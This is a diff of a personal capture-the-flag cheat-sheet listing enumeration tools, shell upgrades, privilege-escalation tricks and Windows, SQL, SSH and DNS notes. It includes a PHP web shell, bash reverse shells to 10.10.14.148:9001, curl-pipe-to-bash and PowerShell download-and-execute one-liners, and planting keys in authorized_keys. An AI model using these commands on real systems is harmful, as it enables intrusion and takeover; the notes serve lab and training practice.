@@ -1,69 +1,90 @@
-#CTF Notes
+# CTF Notes
 
-##Linux
+## Linux
 
 Website for searching for shells through random programs such as 'vi' "living off the land binaries": https://gtfobins.github.io/ 
-Raw memory location so no files on disk: /dev/shm/
 
-###Enumeration
+Raw memory location so no files on disk: 
+> /dev/shm/
+
+### Enumeration
 
 find files user has access to: 
-> find / -user <username> -ls 2>/dev/null
-
-full linux enumeration: LinEnum.py from github #This is very helpful!! /// Also LinPEAS
+```
+find / -user <username> -ls 2>/dev/null
+```
+full linux enumeration: 
+> LinEnum.py 
+> LinPEAS.sh https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+download * *and* * execute script (such as LinEnum.py) [from remote host]: 
+```curl <url or IP>/LinEnum.sh | bash```
 Locate exploits: 
-> searchsploit <name_of_program> # -x then name/number of exploit to pull up code
-
-enumerate running processes: pspy
+```
+searchsploit <name_of_program> # -x then name/number of exploit to pull up code
+```
+enumerate running processes: 
+> pspy
 enumeration multi-tool: Sparta (does nmap, hydra, nikto, sqlscan, ssl...)
 http://bastille-linux.sourceforge.net/assessment.htm
 enumerate info about current process running from: /proc/self/status
 https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
 
-###Upgrade shells:
+### Upgrade shells:
 
 ```
 1. [user@localhost]$ sudo python -c 'import pty; pty.spawn("/bin/sh")'
 2. [user@localhost]$ sudo perl -e 'exec "/bin/sh";'
 3. [user@localhost]$ sudo ruby -e 'exec "/bin/sh"'
 ```
-
 php shell: 
-> <?php system($_GET['variable_name']); ?>
+```<?php system($_GET['variable_name']); ?>```
 bash reverse shell: 
-> bash -i >& /dev/tct/10.10.14.148/9001 0>&1
+```
+bash -i >& /dev/tct/10.10.14.148/9001 0>&1
 URL encoded: 
-> bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
-
+bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
+```
 nc listener: 
->nc -lvnp 9001
+```nc -lvnp <port>```
+To upgrade to fully interactive shell:   
+```
+python -c 'import pty;pty.spawn("/bin/bash")'; 
+[ctrl-z to background]
+stty raw -echo; 
+[fg to return shell to foreground]
+export TERM=xterm 
+```
 
-python shell:   
-```
-python -c 'import pty;pty.spawn("/bin/bash")'; #for interactive shell
-^[ctrl-z to background]; stty raw -echo; #after python shell for full interactive
-^export TERM=xterm #use after ^ to allow to clear screen in remote shell...
-```
+### TMUX
 
-###TMUX
-tmux can keep alive sessions if lose ssh etc, split panes: 
+tmux can keep alive sessions if you lose ssh sessions etc, can split panes and more: 
 ```
-tmux new -s <session_name>
-**ctrl-b** = prefix key (addnl commands) +[%]vertical  or + ["]horizontal to split windows +[arrow_keys] move between panes +[z] zoom in/out on pane +[?] help for tmux +[t] timer
+tmux new -s <session_name> 
+**ctrl-b** = prefix key (enables addnl commands) 
++[%] vertical pane  
++["] horizontal pane 
++[alt-space] switch pane between horizontal or vertical
++[arrow_keys] move between panes 
++[z] zoom in/out on pane 
++[?] help for tmux 
++[t] timer
+```
+tmux plugins:
 tmux logging plugin (get this!!) can save log of tmux windows
-alt-[.] cycle through previous arguments
-ctrl-[arrow_keys] move between "words" on a command line
-````
 https://github.com/NHDaly/tmux-better-mouse-mode
 
-**Privilege Escalation**
-execute command as another user; sudo -u <username> [command]
-execute any command: while in less [!]
-Privilege Escalation to Root: chmod 47555 /bin/less
-^ less /etc/shadow //can run commands in less with :!
-download and execute script (LinEnum) [from victim]: curl <url or IP>/LinEnum.sh | bash
+### Privilege Escalation
+
 https://payatu.com/guide-linux-privilege-escalation
-[user@localhost]$ sudo find /etc -exec sh -i \;
+
+execute command as another user; 
+```sudo -u <username> [command]```
+execute any command while in less 
+```!<cmd>```
+Privilege Escalation to Root with suid /bin/less: 
+```chmod 47555 /bin/less```
+Privilege Escalation to Root with find:
+```sudo find /etc -exec sh -i \;```
 wildcard injection: [NEED MORE HERE]
 mawk 'BEGIN {system("/bin/sh")}'
 1. [user@localhost]$ sudo vi
@@ -79,9 +100,7 @@ mawk 'BEGIN {system("/bin/sh")}'
 3. [root@localhost]#
 Note: for this method to work, the attacker has to read a file that is longer than one page
 
-
-
-###Misc Linux
+### Misc Linux
 list all running commands: ps -eo command
 ^change delimiter to \n instead of [space] (loop by line): IFS=$'\n'
 ^loop through each line in output: for i in $(ps -eo command); do echo $i; done
@@ -92,11 +111,18 @@ pretty print text in console? [Haven't looked this one up]: jq
 wfuzz
 convert rpm to debian packages: alien <file.rpm>
 Makes PWD part of path so dont need './' [NOT RECOMMENDED!]: export PATH='pwd':$PATH
+alt-[.] cycle through previous arguments
+ctrl-[arrow_keys] move between "words" on a command line
 
-##Windows
+## Windows
 
 https://lolbas-project.github.io/ - living off the land binaries
 
+### Enumeration
+> WinPEAS https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+
+
+### Unsorted
 Powershell full path: C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
 Powershell "wget" and execute remote code: powershell "Invoke-Expression(New-Object Net.Webclient).downloadString('http://<ip>:<port>/<filename>')"
 Powershell Script Execution Bypass: [can embed in php too!]: echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>) | powershell -noprofile -
@@ -114,7 +140,7 @@ check what updates are installed: type WindowsUpdate.log
 
 net use share from linux [like SimpleHTTPServer for Samba]: impacket-smbserver <sharename> '<dir_to_share>'
 
-##Miscelaneous
+## Miscelaneous
 
 Encryption/Decryption
 https://gchq.github.io/CyberChef/
@@ -129,7 +155,7 @@ generate password for insertion into /etc/passwd: openssl passwd -l (1?) -salt <
 Hashes.org: large database of pre-cracked hashes
 password lists: https://wiki.skullsecurity.org/Passwords
 
-###Binary Exploitation
+### Binary Exploitation
 gdb plugin for exploits/creates patterns for ROP determination: peda.py/pwndbg [gdb: pattern create ###]
 ASLR Bypass/binary exploit/gdb: Ippsec:HackTheBox - October /// Ippsec:Camp CTF - Bitterman [pwnTools]
 Binary Ninja
@@ -137,7 +163,7 @@ Packetstorm /bin/sh shellcode
 simple binary exploitation [Ippsec:HacktheBox - Sneaky]
 protostar ctf for getting into binary exploitation
 
-###HTTP
+### HTTP
 in order to proxy tools that have no proxy option: create burn proxy 127.0.0.1:80 [Ippsec:HacktheBox - Granny & Grandpa]
 vulnerability testing for webdav (or other file upload vulns!): davtest
 bypassing filetype filters with http MOVE command to rename allowed filetype [Ippsec:HacktheBox - Granny & Grandpa]
@@ -147,21 +173,21 @@ virtual host routing: substitute ip for hostname to get different results
 gobuster -u <url> -l -w <wordlist> -x php -t 20 [-l include length, -x append .php to searches, -t threads]
 hydra against http wordpress login walkthrough [IppSec:HacktheBox - Apocalyst]
 
-###SQL
+### SQL
 blind sql injection UNIoN queries [Ippsec:HacktheBox - Charon] use CONCAT("x","x")
 get shell in mysql: \! /bin/sh
 https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
 
-###DNS
+### DNS
 DNS reverse lookup recon: dnsrecon -r <ip/subnet[127.0.0.0/24]> -n <ip_to_check>
 DNS zone transfer: dig axfr <hostname> @<ip>
 add DNS server: /etc/resolv.conf {nameserver <ip>}
 add Hosts: /etc/hosts
 
-###Steganography
+### Steganography
 extract files from stego'd files: binwalk -Me <filename>
 
-###SSH
+### SSH
 generate ssh key for access: ssh-keygen -f <filename>; cat <filename>; 
 ^ #copy to remote host; echo <copied_key> > ./.ssh/authorized_keys
 ^use generated key to ssh remote: chmod 600 <filename>; ssh -i <filename> <remotehost>
@@ -174,7 +200,7 @@ ssh 127.0.0.1 /bin/dash
 Use bash with command options to disable processing startup files:
 ssh 127.0.0.1 "bash --noprofile --norc"
 
-###Unsorted
+### Unsorted
 shortcut for all ports: nmap -p-
 Firefox Browser plugins:Tampermonkey (userscript manager); Cookie Manager+; 
 signing APK files: IppSec:HHC2016 - Debug
@@ -190,7 +216,7 @@ Hurricane Electric ISP - http://he.net/ [Ippsec uses with IPv6 as a psuedo-VPN]
 IPv6 primer [Ippsec:HacktheBox - Sneaky] fe80::/10 - febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Link Local 169.254.x.x APIPA (built from MAC address on Linux, 7th bit flips, adds ff:fe in the center)/// fc00::/7 - fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Local Unicast 10.x.x.x, 172.16.x.x, 192.168.x.x /// 2000::/3 - Global Unicast routable /// ff02::1 - Multicast All Nodes /// ff02::2 Multicast ROUTER nodes
 ip6tables - iptables for ipv6
 
-##Write-ups
+## Write-ups
 
 https://medium.com/bugbountywriteup
 https://cowsayroot.com/
@@ -200,7 +226,7 @@ https://resources.infosecinstitute.com/tools-of-trade-and-resources-to-prepare-i
 https://www.reddit.com/r/hackthebox/
 https://mzfr.github.io/vulnhub-writeups/
 
-##CTF Tools & Cheatsheets
+## CTF Tools & Cheatsheets
 
 https://github.com/Ganapati/RsaCtfTool <-- RSA cracking tools //uncipher data from weak public key and try to recover private key
 https://www.capturetheflags.com/tools-for-ctf/   <--Has both linux and windows
